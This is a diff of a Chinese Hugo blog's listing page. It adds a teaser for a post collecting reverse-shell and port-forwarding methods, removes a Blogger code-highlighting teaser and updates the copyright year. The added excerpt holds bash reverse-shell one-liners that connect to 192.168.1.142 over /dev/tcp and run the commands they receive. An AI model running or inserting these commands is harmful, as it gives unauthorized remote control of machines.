@@ -87,6 +87,17 @@
 </header>
 <article class=post-entry>
 <header class=entry-header>
+<h2>反弹shell以及端口转发的方法收集
+</h2>
+</header>
+<section class=entry-content>
+<p>Bash 1 bash -i >& /dev/tcp/192.168.1.142/80 0>&1 1 2 3 4 exec 5&lt;>/dev/tcp/192.168.1.142/80 cat &lt;&5 | while read line; do $line 2>&5 >&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2>&5 >&amp;5; done ...</p>
+</section>
+<footer class=entry-footer><span title="2018-08-23 16:03:29 +0000 UTC">August 23, 2018</span>&nbsp;·&nbsp;1 分钟&nbsp;·&nbsp;<span id=busuanzi_container_page_pv><span id=busuanzi_value_page_pv></span></span></footer>
+<a class=entry-link aria-label="post link to 反弹shell以及端口转发的方法收集" href=//hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward/></a>
+</article>
+<article class=post-entry>
+<header class=entry-header>
 <h2>为纸小墨一键创建md文件
 </h2>
 </header>
@@ -135,18 +146,6 @@ Demo ink-theme-story
 <footer class=entry-footer><span title="2018-08-22 15:18:42 +0000 UTC">August 22, 2018</span>&nbsp;·&nbsp;1 分钟&nbsp;·&nbsp;<span id=busuanzi_container_page_pv><span id=busuanzi_value_page_pv></span></span></footer>
 <a class=entry-link aria-label="post link to git忽略对已入库文件的修改" href=//hacktech.cn/2018/08/22/git-update-index/></a>
 </article>
-<article class=post-entry>
-<header class=entry-header>
-<h2>blogger添加代码高亮
-</h2>
-</header>
-<section class=entry-content>
-<p>blogger(blogspot)自带的是没有代码高亮的，我们可以用下面的方法添加代码高亮。
-...</p>
-</section>
-<footer class=entry-footer><span title="2018-05-26 22:11:00 +0000 UTC">May 26, 2018</span>&nbsp;·&nbsp;1 分钟&nbsp;·&nbsp;<span id=busuanzi_container_page_pv><span id=busuanzi_value_page_pv></span></span></footer>
-<a class=entry-link aria-label="post link to blogger添加代码高亮" href=//hacktech.cn/2018/05/26/blogger-code-highlight/></a>
-</article>
 <footer class=page-footer>
 <nav class=pagination>
 <a class=prev href=//hacktech.cn/posts/page/10/>« 上一页</a>
@@ -155,7 +154,7 @@ Demo ink-theme-story
 </footer>
 </main>
 <footer class=footer>
-<span>&copy; 2021 <a href=//hacktech.cn/>Akkuman 的博客</a></span>
+<span>&copy; 2022 <a href=//hacktech.cn/>Akkuman 的博客</a></span>
 <span>
 Powered by
 <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
